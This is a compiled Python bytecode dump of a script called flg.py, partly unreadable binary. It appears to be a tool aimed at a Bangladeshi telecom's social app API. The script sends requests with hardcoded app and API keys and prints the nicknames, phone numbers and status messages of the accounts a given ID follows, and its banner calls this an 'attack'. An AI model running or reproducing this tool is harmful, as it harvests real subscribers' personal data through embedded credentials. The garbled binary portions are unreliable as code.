o
    ��b^
  �                   @   s  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdd� Zeeed e
 ��Ze �d� eed � e�d�Zeed � ee	d � eed e	 d e d � e�d� ee
de�� d � eed � ee
d � d dlZd dlmZ d dlZde Ze� Zded< ded< d ed!< d"ed#< d$ed%< z	ejeed&�ZW n   ed'� Y e�� d( d)kr�eed* e	 e�� d+ d,  d- � e�� d+ d. Zeee��D ]~Zd dl Z d dlZd dlZd d/lmZ d d0l m!Z!m"Z"m#Z#m$Z$ e	d1 e e�� d+ d. e d2  e	 d3 e e�� d+ d. e d4  e	 d5 e e�� d+ d. e d6  e	 d7 e e�� d+ d. e d8  Z%e%D ]Z&ej'�(e&� ej'�)�  e�d� �qXq�eee	d9 e
 d: e	 d; ��Z*e �d� dS )<�    N�clearzlolcat banner.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   �{�G�z�?)�sys�stdout�write�flush�time�sleep)ZPuDiNaZword� r   �flg.py�	logoprint   s
   
�r   z[>] Enter ID: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : Mr. MoJiiBz	 VERSION 	  : 3.0u   	 ♥♥z	 Mr. MoJiiBr   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictzVhttps://circle.robi.com.bd/mylife/appapi/appcall.php?op=getFollowingInfoList&nickname=�gzipz
User-AgentZ(000oc0so48owkw4s0wwo4c00g00804w80gwkw8kgz	x-app-keyZ e83c79e65b2ea6c16b30b3ad5b16c238z	x-api-keyzapplication/jsonzContent-Type�0zContent-Length)�headerszNet Connection ErrorZrdescZOKz[>] Total Following:�data�totalz 
Z	following)r
   )�init�Fore�Back�Stylez

[>] CIRCLE ID	:	Znicknamez
[>] NUMBER	:	Zmsisdnz 
[>] STATUS ID	:	Z	status_idz
[>] LAST SHOUT	:	Zmlstatusz
 

	 Pressz Enterz To Exit)+�os�system�printZasyncior   Zrequestsr	   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanr   �str�input�a�getZresponser
   ZjsonZrequests.structuresr   Zurlr   ZpostZresp�y�range�len�iZcoloramar   r   r   r   Zwords�charr   r   r   Zxnr   r   r   r   �<module>   sp   





	
$�
� 